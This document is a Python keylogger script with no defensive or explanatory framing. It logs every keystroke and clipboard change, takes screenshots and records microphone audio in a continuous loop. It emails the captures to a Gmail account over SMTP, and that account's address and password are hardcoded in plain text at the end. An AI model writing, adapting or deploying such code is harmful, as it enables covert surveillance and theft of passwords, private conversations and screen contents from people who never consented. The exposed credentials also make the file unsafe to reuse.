#!usr/bin/rnv/python3

# for captuing screenshot
import pyscreenshot

# for capturing key strokes
import pynput.keyboard

# for threading
import threading

# for recording and saving audio
import sounddevice as sd
from scipy.io.wavfile import write

# for sending mail with attachment
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

#for capturing clipboard
import clipboard

class keylogger:

    def __init__(self,id,pswd):
        self.temp = ""
        self.log = ""
        self.id = id
        self.pswd = pswd

    def screenshot(self):
        image = pyscreenshot.grab()
        image.save("screenshot.jpg")
        self.clip()
        self.mail("screenshot.jpg")


    def audio(self):
        fs = 44100  # Sample rate
        seconds = 10

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('output.wav', fs, myrecording)  # Save as WAV file
        self.mail("output.wav")

    def mail(self,file):

        message = MIMEMultipart()

        message["From"] = self.id
        message["To"] = self.id

        attachment = open(file,'rb')
        body = self.log

        message.attach(MIMEText(body,"plain"))

        obj = MIMEBase('application','octet-stream')

        obj.set_payload((attachment).read())
        encoders.encode_base64(obj)
        obj.add_header("Content-Disposition","attachment; filename= " + file)

        message.attach(obj)

        my_message = message.as_string()

        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(self.id,self.pswd)
        server.sendmail(self.id,self.id,my_message)
        self.log = ""
        server.quit()

    def clip(self):
        text = clipboard.paste()
        if text == self.temp:
            pass
        else:
            self.temp = text
            self.add_to_log(self.temp)


    def add_to_log(self,k):
        self.log = self.log + k

    def process_key_press(self,key):
        try:
            k = str(key.char)
        except AttributeError:
            if key == key.space:
                k = " "
            else:
                k = " " + (str(key)) + " "
        self.add_to_log(k)

    def advance(self):
        self.clip()
        self.audio()
        self.screenshot()
        timer = threading.Timer(0,self.advance)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.advance()
            keyboard_listener.join()

obj = keylogger("tt709218@gmail.com","qaz123!@")
obj.start()
